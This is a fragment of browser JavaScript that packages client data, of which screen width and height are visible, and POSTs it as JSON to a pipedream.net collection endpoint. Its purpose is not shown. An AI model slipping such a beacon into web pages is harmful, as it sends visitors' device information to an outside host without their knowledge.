          width: screen.width,
          height: screen.height,
        }
      };

      await fetch("https://eoc7rtgq66dkqic.m.pipedream.net", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });
